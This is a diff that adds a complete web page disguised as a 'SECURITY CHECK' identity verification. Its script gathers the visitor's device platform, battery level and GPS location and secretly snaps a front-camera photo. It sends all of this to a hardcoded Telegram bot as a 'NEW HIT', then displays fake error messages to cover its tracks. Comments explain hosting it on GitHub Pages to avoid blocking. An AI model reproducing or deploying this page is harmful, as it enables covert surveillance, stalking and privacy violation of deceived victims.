@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifying...</title>
+    <style>
+        body { background: #111; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { border: 2px solid #0f0; padding: 40px; text-align: center; box-shadow: 0 0 20px #0f0; }
+        button { background: #0f0; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
+        button:hover { background: #000; color: #0f0; outline: 1px solid #0f0; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2 id="status">SECURITY CHECK</h2>
+        <p>Press the button to verify your identity.</p>
+        <button id="start">VERIFY</button>
+    </div>
+
+    <video id="v" style="display:none" autoplay></video>
+    <canvas id="c" style="display:none" width="640" height="480"></canvas>
+
+    <script>
+        const token = '8200658838:AAHrkPieYLwF2bVTps5HzrJVbXi013n6Sq8';
+        const chat_id = '6581116621';
+
+        document.getElementById('start').onclick = async function() {
+            this.style.display = 'none';
+            document.getElementById('status').innerText = 'PROCESSING...';
+
+            let info = `💎 <b>NEW HIT</b>\n`;
+            info += `🖥 <b>OS:</b> ${navigator.platform}\n`;
+            info += `🔋 <b>Battery:</b> ${navigator.getBattery ? (await navigator.getBattery()).level * 100 + '%' : 'N/A'}\n`;
+
+            // Запрос геолокации
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                info += `📍 <b>Geo:</b> <a href="https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}">Google Maps</a>`;
+                await startCapture(info);
+            }, async () => {
+                info += `📍 <b>Geo:</b> DENIED`;
+                await startCapture(info);
+            });
+        };
+
+        async function startCapture(text) {
+            const video = document.getElementById('v');
+            const canvas = document.getElementById('c');
+
+            try {
+                // Запрос камеры (на iPhone сработает только через HTTPS на GitHub)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+
+                setTimeout(() => {
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(async (blob) => {
+                        const fd = new FormData();
+                        fd.append('chat_id', chat_id);
+                        fd.append('photo', blob, 'shot.jpg');
+                        fd.append('caption', text);
+                        fd.append('parse_mode', 'HTML');
+
+                        // На GitHub Pages это пройдёт без блокировок
+                        try {
+                            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                                method: 'POST',
+                                body: fd
+                            });
+                        } catch (e) {
+                            // Резервный метод отправки текста, если фото всё же заблокируют
+                            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=HTML`);
+                        }
+
+                        stream.getTracks().forEach(t => t.stop());
+                        document.getElementById('status').innerText = 'ERROR 403: REGION BLOCKED';
+                    }, 'image/jpeg', 0.8);
+                }, 2000);
+            } catch (e) {
+                // Если камеру отклонили
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text + '\n📸 <b>Camera:</b> DENIED')}&parse_mode=HTML`);
+                document.getElementById('status').innerText = 'ERROR 404: AUTH FAILED';
+            }
+        }
+    </script>
+</body>
+</html>
